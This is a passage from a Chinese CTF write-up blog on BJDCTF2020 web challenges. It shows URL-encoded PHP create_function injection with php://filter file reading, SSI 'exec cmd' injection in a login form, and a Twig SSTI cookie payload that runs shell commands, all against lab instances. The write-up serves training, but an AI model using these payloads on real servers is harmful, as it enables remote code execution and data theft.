</span></span></code></pre></td></tr></table></div></div><p>实际传参还是要编码的,但是非常傻逼的就是,必须把file放在前面,md不知道怎么检测的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>debu=1&amp;file=1
</span></span></code></pre></td></tr></table></div></div><p><code>extract($_GET["flag"]);</code>我们进行覆盖<code>code</code>和<code>ag</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag[code]=create_function&amp;flag[arg]=;}phpinfo();//
</span></span><span class=line><span class=cl>当然也要编码
</span></span></code></pre></td></tr></table></div></div><p><code>get_defined_vars ()</code>返回一个关联数组，其中包含当前作用域内所有已定义的变量及其值。既然包含了<code>flag.php</code>,那我们就看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>flag</span><span class=p>[</span><span class=n>code</span><span class=p>]</span><span class=o>=</span><span class=n>create_function</span><span class=o>&amp;</span><span class=n>flag</span><span class=p>[</span><span class=n>arg</span><span class=p>]</span><span class=o>=</span><span class=p>;}</span><span class=n>var_dump</span><span class=p>(</span><span class=n>get_defined_vars</span><span class=p>());</span><span class=o>//</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=n>file</span><span class=o>=%</span><span class=mi>64</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>3</span><span class=n>a</span><span class=o>%</span><span class=mi>2</span><span class=n>f</span><span class=o>%</span><span class=mi>2</span><span class=n>f</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>78</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>2</span><span class=n>f</span><span class=o>%</span><span class=mi>70</span><span class=o>%</span><span class=mi>6</span><span class=n>c</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>%</span><span class=mi>2</span><span class=n>c</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>71</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>61</span><span class=o>&amp;%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>75</span><span class=o>=%</span><span class=mi>61</span><span class=o>%</span><span class=mi>71</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>0</span><span class=n>A</span><span class=o>&amp;%</span><span class=mi>73</span><span class=o>%</span><span class=mi>68</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>%</span><span class=mi>61</span><span class=p>[]</span><span class=o>=</span><span class=mi>1</span><span class=o>&amp;%</span><span class=mi>70</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>77</span><span class=o>%</span><span class=mi>64</span><span class=p>[]</span><span class=o>=</span><span class=mi>2</span><span class=o>&amp;%</span><span class=mi>66</span><span class=o>%</span><span class=mi>6</span><span class=n>c</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=n>b</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>6</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>5</span><span class=n>d</span><span class=o>=%</span><span class=mi>63</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=n>f</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>&amp;%</span><span class=mi>66</span><span class=o>%</span><span class=mi>6</span><span class=n>c</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=n>b</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=n>d</span><span class=o>=</span><span class=p>;}</span><span class=o>%</span><span class=mi>76</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>6</span><span class=n>d</span><span class=o>%</span><span class=mi>70</span><span class=p>(</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>76</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>73</span><span class=p>());</span><span class=o>//</span>
</span></span><span class=line><span class=cl><span class=n>POST</span><span class=p>:</span><span class=n>debu</span><span class=o>=</span><span class=mi>1</span><span class=o>&amp;</span><span class=n>file</span><span class=o>=</span><span class=mi>1</span>
</span></span></code></pre></td></tr></table></div></div><p>找到<code>rea1fl4g.php</code></p><p>因为禁用的符号挺多的,这里我们使用<code>require</code>和<code>filter</code>协议来读取文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)
</span></span><span class=line><span class=cl>取反
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST:
</span></span><span class=line><span class=cl>debu=1&amp;file=1
</span></span></code></pre></td></tr></table></div></div><p>真恶心啊,特别是编码哪一块,浪费很多时间</p><h1 id=bjdctf2020easysearch>[BJDCTF2020]EasySearch</h1><p>目录扫描到<code>index.php.swp</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>	<span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>function</span> <span class=nf>get_hash</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$chars</span> <span class=o>=</span> <span class=s1>&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$random</span> <span class=o>=</span> <span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>73</span><span class=p>)]</span><span class=o>.</span><span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>73</span><span class=p>)]</span><span class=o>.</span><span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>73</span><span class=p>)]</span><span class=o>.</span><span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>73</span><span class=p>)]</span><span class=o>.</span><span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>73</span><span class=p>)];</span><span class=c1>//Random 5 times
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nv>$content</span> <span class=o>=</span> <span class=nx>uniqid</span><span class=p>()</span><span class=o>.</span><span class=nv>$random</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$content</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Content-Type: text/html;charset=utf-8&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=o>***</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>])</span> <span class=k>and</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$admin</span> <span class=o>=</span> <span class=s1>&#39;6d0bc1&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=nv>$admin</span> <span class=o>==</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]),</span><span class=mi>0</span><span class=p>,</span><span class=mi>6</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$file_shtml</span> <span class=o>=</span> <span class=s2>&#34;public/&#34;</span><span class=o>.</span><span class=nx>get_hash</span><span class=p>()</span><span class=o>.</span><span class=s2>&#34;.shtml&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$shtml</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=nv>$file_shtml</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Unable to open file!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$text</span> <span class=o>=</span> <span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>            ***
</span></span></span><span class=line><span class=cl><span class=s1>            ***
</span></span></span><span class=line><span class=cl><span class=s1>            &lt;h1&gt;Hello,&#39;</span><span class=o>.</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=s1>            ***
</span></span></span><span class=line><span class=cl><span class=s1>			***&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$shtml</span><span class=p>,</span><span class=nv>$text</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>fclose</span><span class=p>(</span><span class=nv>$shtml</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=o>***</span>
</span></span><span class=line><span class=cl>			<span class=k>echo</span> <span class=s2>&#34;[!] Header  error ...&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=o>***</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=o>***</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>爆破</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10000000000000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span><span class=o>=</span><span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>m</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>6</span><span class=p>]</span><span class=o>==</span><span class=s1>&#39;6d0bc1&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span></code></pre></td></tr></table></div></div><p>之后,输入没回显,于是抓包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Response:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Server: openresty
</span></span><span class=line><span class=cl>Date: Mon, 12 Aug 2024 07:31:59 GMT
</span></span><span class=line><span class=cl>Content-Type: text/html;charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 568
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>X-Powered-By: PHP/7.1.27
</span></span><span class=line><span class=cl>Url_Is_Here: public/99f40cea251233eb066306b560786af165289a0d.shtml
</span></span><span class=line><span class=cl>Vary: Accept-Encoding
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>    &lt;html&gt;
</span></span><span class=line><span class=cl>    &lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;Login&lt;/title&gt;
</span></span><span class=line><span class=cl>    &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html;charset=UTF-8&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;link href=&#34;public/css/base.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;link href=&#34;public/css/login.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;/head&gt;
</span></span><span class=line><span class=cl>    &lt;body&gt;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;[!] Header  error ...            &lt;div id=&#34;tip&#34;&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>    &lt;div class=&#34;foot&#34;&gt;
</span></span><span class=line><span class=cl>    bjd.cn
</span></span><span class=line><span class=cl>    &lt;/div&gt;
</span></span><span class=line><span class=cl>    &lt;/form&gt;
</span></span><span class=line><span class=cl>&lt;/div&gt;&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p>进入界面之后发现IP不可控,只能看看<code>username</code></p><p>后面观察是<code>shtml</code>上网查了一下名为<code>SSI注入</code></p><h2 id=ssi>SSI</h2><ul><li>Web服务器为Apache和IIS（支持SSI功能的服务器）</li><li>服务器有上传或者用户输入页面且未对相关SSI关键字做过滤</li><li>Web应用程序在返回响应的HTML页面时，嵌入用户输入</li><li>未对输入的参数值进行输入过滤</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!--#exec cmd=&#34;id&#34;&gt; --&gt;
</span></span><span class=line><span class=cl>是可以执行命令的
</span></span></code></pre></td></tr></table></div></div><p>也就是说我们在网页生成以后的shtml文件中就可以看到命令结果</p><p>看包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST /index.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 61d84261-0376-475e-82b8-6957f642df64.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Content-Length: 52
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Origin: http://61d84261-0376-475e-82b8-6957f642df64.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Referer: http://61d84261-0376-475e-82b8-6957f642df64.node5.buuoj.cn:81/index.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=&lt;!--#exec cmd=&#34;ls ../&#34; --&gt;&amp;password=2020666
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /index.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 61d84261-0376-475e-82b8-6957f642df64.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Content-Length: 55
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Origin: http://61d84261-0376-475e-82b8-6957f642df64.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Referer: http://61d84261-0376-475e-82b8-6957f642df64.node5.buuoj.cn:81/index.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=&lt;!--#exec cmd=&#34;tac ../f*&#34; --&gt;&amp;password=2020666
</span></span></code></pre></td></tr></table></div></div><h1 id=bjdctf2020cookie-is-so-stable>[BJDCTF2020]Cookie is so stable</h1><p>查看源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!-- Why not take a closer look at cookies? --&gt;
</span></span></code></pre></td></tr></table></div></div><p>终于翻了几个网页找到了注入点ssti</p><p><code>php</code>的<code>ssti</code>还是第一次,去网上查了一下,直接套的<code>payload</code></p><p><code>Twig</code>模块应该是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>request:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST /flag.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 54976d8d-7256-49ea-b9f5-92dbf98e734e.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Content-Length: 0
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Origin: http://54976d8d-7256-49ea-b9f5-92dbf98e734e.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Referer: http://54976d8d-7256-49ea-b9f5-92dbf98e734e.node5.buuoj.cn:81/flag.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=15294df4dceeffc6c03a4f227f7f3392;user={{_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}{{_self.env.getFilter(&#34;tac /f*&#34;)}}
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><p>但是为什么不能读取目录呢</p><p>本来想着读取目录的,但是过滤的确实多,弄了好一会二都没出</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
